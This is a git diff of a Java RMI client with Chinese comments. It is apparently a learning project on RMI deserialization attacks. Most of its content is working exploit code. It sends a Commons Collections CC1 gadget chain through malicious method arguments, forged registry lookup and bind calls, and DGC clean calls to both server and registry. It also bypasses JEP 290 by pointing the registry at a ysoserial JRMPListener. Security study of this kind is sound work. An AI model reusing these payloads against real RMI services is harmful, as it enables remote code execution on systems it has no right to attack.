@@ -6,12 +6,12 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
-import org.springframework.web.bind.annotation.RestController;
 import sun.rmi.registry.RegistryImpl_Stub;
 import sun.rmi.server.UnicastRef;
 import sun.rmi.transport.DGCImpl_Stub;
 import sun.rmi.transport.Endpoint;
 import sun.rmi.transport.LiveRef;
+import sun.rmi.transport.StreamRemoteCall;
 import sun.rmi.transport.tcp.TCPEndpoint;
 
 import java.io.ByteArrayOutputStream;
@@ -19,20 +19,21 @@ import java.io.IOException;
 import java.io.ObjectOutput;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.*;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
 import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
-import java.rmi.server.ObjID;
-import java.rmi.server.Operation;
-import java.rmi.server.RemoteCall;
-import java.rmi.server.RemoteObject;
+import java.rmi.server.*;
 import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.Random;
+
 
 /**
  * @author hasee
  * @version 1.0
- * @description: TODO
+ * @description: RMI 客户端
  * @date 2023/5/3 11:59
  */
 public class MyRemoteClient {
@@ -42,45 +43,103 @@ public class MyRemoteClient {
         // 通过服务名查找服务，并转型成接口
         IMyRemote myRemote = (IMyRemote) registry.lookup("myRemote");
         // 调用方法
-        // myRemote.saySth("Hello");
+        myRemote.saySth("Hello");
+        // myRemote.saySth(new HashMap<>());
+
 
         // 通过 Object 类型传入恶意类
         // attackByObject(myRemote);
 
         // 自定义 lookup 然后发起请求
         // myLookup(registry);
+
         // 自定义 bind 然后发起请求
         // myBind(registry);
         // JEP 290 后，服务端和注册中心必须在同一个 host 下，那么客户端就不能发起 bind 和 rebind 请求了
         // bind 和 rebind 也可以，不过由于其绑定时传入的是 Remote 的子类（自己定义的远程调用接口也是继承 Remote），因此还有一个思路就是传入恶意的 Remote 子类。
         // https://su18.org/post/rmi-attack/#2-%E6%94%BB%E5%87%BB-registry-%E7%AB%AF su18 师傅用的是 CC6 链
 
-        // 自定义 DGC clean 请求并向服务中心和服务端发起攻击
-        // myDGCClean(registry);
+        // 自定义 DGC clean 请求
+        // attackServerDGCClean(myRemote);
+
+        // 自定义 DGC clean 请求并向服务中心发起攻击
+        // attackRegistryDGCClean(registry);
 
         // 绕过 JEP 290
-        attackBypassJEP290(myRemote);
+        attackBypassJEP290(registry);
+    }
+
+    private static void attackServerDGCClean(IMyRemote myRemote) throws Exception{
+        // 1. 先拿到远程对象相关的 UnicastRef
+        Field remoteObjectInvocationHandlerField = Class.forName("java.lang.reflect.Proxy").getDeclaredField("h");
+        remoteObjectInvocationHandlerField.setAccessible(true);
+        RemoteObjectInvocationHandler remoteObjectInvocationHandler = (RemoteObjectInvocationHandler) remoteObjectInvocationHandlerField.get(myRemote);
+        UnicastRef unicastRef = (UnicastRef) remoteObjectInvocationHandler.getRef();
+
+        // 2. 通过 UnicastRef，获取到 LiveRef
+        LiveRef liveRef = unicastRef.getLiveRef();
+        // 再通过反射拿到 TCPEndpoint
+        Class<? extends LiveRef> tcpEndpointClass = liveRef.getClass();
+        Field epField = tcpEndpointClass.getDeclaredField("ep");
+        epField.setAccessible(true);
+        TCPEndpoint tcpEndpoint = (TCPEndpoint) epField.get(liveRef);
+        // 根据客户端在 DGCImpl_Stub 被创建的流程，拿到其内部类 EndpointEntry 类，调用它的 lookup 方法（返回值是 EndpointEntry）并创建 DGCImpl_Stub
+        Class<?> DGCClient_EndpointEntryClass = Class.forName("sun.rmi.transport.DGCClient$EndpointEntry");
+        Method lookupMethod = DGCClient_EndpointEntryClass.getDeclaredMethod("lookup", Endpoint.class);
+        lookupMethod.setAccessible(true);
+        // lookup 是静态方法，第一个参数传 null
+        Object endpointEntry = lookupMethod.invoke(null, tcpEndpoint);
+        Field dgcField = endpointEntry.getClass().getDeclaredField("dgc");
+        dgcField.setAccessible(true);
+        DGCImpl_Stub dgc = (DGCImpl_Stub) dgcField.get(endpointEntry);
+        // 本质上就是拿到 DGC/DGCImpl_Stub 通信时用到的 UnicastRef，这里和上面的 unicastRef 对比，其 ObjID 发生了改变。
+        UnicastRef unicastRef2 = (UnicastRef) dgc.getRef();
+        final java.rmi.server.Operation[] operations = {
+                new java.rmi.server.Operation("void clean(java.rmi.server.ObjID[], long, java.rmi.dgc.VMID, boolean)"),
+                new java.rmi.server.Operation("java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[], long, java.rmi.dgc.Lease)")
+        };
+        final long interfaceHash = -669196253586618813L;
+        StreamRemoteCall call = (StreamRemoteCall)unicastRef2.newCall(dgc,
+                operations, 0, interfaceHash);
+        try {
+            java.io.ObjectOutput out = call.getOutputStream();
+            out.writeObject(getSerializedCC1Object());
+        } catch (java.io.IOException e) {
+            throw new java.rmi.MarshalException("error marshalling arguments", e);
+        }
+        unicastRef2.invoke(call);
+        unicastRef2.done(call);
     }
 
     /**
      * 绕过 JEP290，通过 ysoserial 的 JRMPListener 来攻击服务端
-     * @param myRemote
      */
-    private static void attackBypassJEP290(IMyRemote myRemote) {
-        // 创建 UnicastRef
+    private static void attackBypassJEP290(Registry registry) throws Exception {
         // 7777 为 JRMPListener 的开放端口
-        LiveRef liveRef = new LiveRef(new ObjID(), new TCPEndpoint("127.0.0.1", 7777), false);
-        UnicastRef unicastRef = new UnicastRef(liveRef);
-
+        LiveRef liveRef = new LiveRef(new ObjID(new Random().nextInt()), new TCPEndpoint("127.0.0.1", 7777), false);
+        // 创建 UnicastRef
+        UnicastRef payloadObj = new UnicastRef(liveRef);
         try {
-            // 这里不用对恶意类序列化，因为 RegistryImpl_Stub 会对其进行序列化
-            myRemote.getObject(unicastRef);
+            // 拿到 RegistryImpl_Stub 的 UnicastRef
+            UnicastRef unicastRef = (UnicastRef) ((RegistryImpl_Stub) registry).getRef();
+
+            // 模拟 RMI RegistryImpl_Stub 的 lookup，手动对 Registry 发起请求
+            Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"),
+                    new Operation("java.lang.String list()[]"),
+                    new Operation("java.rmi.Remote lookup(java.lang.String)"),
+                    new Operation("void rebind(java.lang.String, java.rmi.Remote)"),
+                    new Operation("void unbind(java.lang.String)")};
+            StreamRemoteCall call = (StreamRemoteCall) unicastRef.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
+            ObjectOutput out = call.getOutputStream();
+
+            out.writeObject(payloadObj);
+            unicastRef.invoke(call);
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
     }
 
-    private static void myDGCClean(Registry registry) throws Exception {
+    private static void attackRegistryDGCClean(Registry registry) throws Exception {
         // 先拿到和注册中心通讯的 UnicastRef
         UnicastRef unicastRef = (UnicastRef) ((RegistryImpl_Stub) registry).getRef();
 
@@ -97,63 +156,36 @@ public class MyRemoteClient {
         Class<?> DGCClient_EndpointEntryClass = Class.forName("sun.rmi.transport.DGCClient$EndpointEntry");
         Method lookupMethod = DGCClient_EndpointEntryClass.getDeclaredMethod("lookup", Endpoint.class);
         lookupMethod.setAccessible(true);
+        // lookup 是静态方法，第一个参数传 null
         Object endpointEntry = lookupMethod.invoke(null, tcpEndpoint);
 
-        // EndpointEntry 对象中给出了调用 dirty 的方法：通过其属性 dgc 然后调用 dgc.dirty。
-        // 这里拿 DGC 就相当于拿到 DGCImpl_Stub（因为 DGC 创建的逻辑是 (DGC) Util.createProxy()，也就是本地创建代理类，和 RegistryImpl_Stub 的逻辑相似
-        // todo 这里可能是需要 EndpointEntry 在实例化过程中（创建 DGCImpl_Stub 的过程中）创建的、和 DGCImpl 通信的 UnicastRef。
-        // 根据 EndpointEntry 构造函数可知，dgc 应该就是 DGCImpl_Stub，然后其 dgcRef 就是在 DGC 中使用的 LiveRef（其实它和 RegistryImpl_Stub 的 LiveRef 相比应该就是只是改了个 ObjID）
         Field dgcField = endpointEntry.getClass().getDeclaredField("dgc");
         dgcField.setAccessible(true);
         DGCImpl_Stub dgc = (DGCImpl_Stub) dgcField.get(endpointEntry);
 
-        // 原先执行 dirty 是（也就是白日梦组长的逻辑）：DGCImpl_Stub 的父类的父类 RemoteObject 的 ref 变量，然后调用它的 newCall()
-        // Class c6 = dgc.getClass().getSuperclass().getSuperclass();
-        // Field refField3 = c6.getDeclaredField("ref");
-        // refField3.setAccessible(true);
-        // UnicastRef unicastRef2 = (UnicastRef) refField3.get(dgc);
-        // 不过实际上父类和子类的 ref/unicastRef 应该是一样的，而且都提供了 getRef() 方法，因此直接用就行
         // 本质上就是拿到 DGC/DGCImpl_Stub 通信时用到的 UnicastRef，这里和上面的 unicastRef 对比，其 ObjID 发生了改变。
         UnicastRef unicastRef2 = (UnicastRef) dgc.getRef();
 
         Operation[] operations = new Operation[]{new Operation("void clean(java.rmi.server.ObjID[], long, java.rmi.dgc.VMID, boolean)"), new Operation("java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[], long, java.rmi.dgc.Lease)")};
         // newCall 的第一个参数是 this，即 DGCImpl_Stub 这里就是 dgc
-        RemoteCall var5 = unicastRef2.newCall(dgc, operations, 1, -669196253586618813L);
-        ObjectOutput var6 = var5.getOutputStream();
-        var6.writeObject(getSerializedCC1Object());
-        unicastRef2.invoke(var5);
-    }
-
-    /**
-     * 模拟 RMI RegistryImpl_Stub 的 bind，手动对 Registry 发起请求
-     * @param registry
-     */
-    private static void myBind(Registry registry) {
-        // 拿到 RegistryImpl_Stub 的 UnicastRef
-        UnicastRef unicastRef = (UnicastRef) ((RegistryImpl_Stub) registry).getRef();
-
-        // 模仿
-        Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"),
-                new Operation("java.lang.String list()[]"),
-                new Operation("java.rmi.Remote lookup(java.lang.String)"),
-                new Operation("void rebind(java.lang.String, java.rmi.Remote)"),
-                new Operation("void unbind(java.lang.String)")};
+        RemoteCall call = unicastRef2.newCall(dgc, operations, 1, -669196253586618813L);
         try {
-            RemoteCall var3 = unicastRef.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);
-            ObjectOutput var4 = var3.getOutputStream();
-            var4.writeObject("test");
-            var4.writeObject(getSerializedCC1Object());
-            unicastRef.invoke(var3);
-        } catch (Exception e) {
-            throw new RuntimeException(e);
+            java.io.ObjectOutput out = call.getOutputStream();
+            out.writeObject(getSerializedCC1Object());
+        } catch (java.io.IOException e) {
+            throw new java.rmi.MarshalException("error marshalling arguments", e);
         }
-
+        unicastRef2.invoke(call);
+        unicastRef2.done(call);
     }
+
+
 
     /**
      * 模拟 RMI RegistryImpl_Stub 的 lookup，手动对 Registry 发起请求，源代码中是将传入的 name(String) 进行序列化发过去，因此在原来的 lookup 上没法下手脚。
      * 因此只能模仿其原生的逻辑，writeObject() 序列化一个对象（而不是 String）发送过去
-     * @param registry
+     *
+     * @param registry 注册中心
      */
     private static void myLookup(Registry registry) {
         try {
@@ -166,10 +198,11 @@ public class MyRemoteClient {
                     new Operation("java.rmi.Remote lookup(java.lang.String)"),
                     new Operation("void rebind(java.lang.String, java.rmi.Remote)"),
                     new Operation("void unbind(java.lang.String)")};
-            RemoteCall var2 = unicastRef.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
-            ObjectOutput var3 = var2.getOutputStream();
-            var3.writeObject(getSerializedCC1Object());
-            unicastRef.invoke(var2);
+            StreamRemoteCall call = (StreamRemoteCall) unicastRef.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
+            ObjectOutput out = call.getOutputStream();
+            // 这里用了 CC1
+            out.writeObject(getSerializedCC1Object());
+            unicastRef.invoke(call);
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
@@ -182,7 +215,7 @@ public class MyRemoteClient {
     public static void attackByObject(IMyRemote myRemote) {
         try {
             // 这里不用对恶意类序列化，因为 RegistryImpl_Stub 会对其进行序列化
-            myRemote.getObject(getSerializedCC1Object());
+            myRemote.saySth(getSerializedCC1Object());
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
@@ -221,7 +254,7 @@ public class MyRemoteClient {
         return aIHClassDeclaredConstructor.newInstance(Override.class, proxyMap);
     }
 
-    // 序列化
+    // 序列化，返回字节码字符串
     public static String serialize(Object payload) {
         // 创建恶意类
         // 创建文件对象
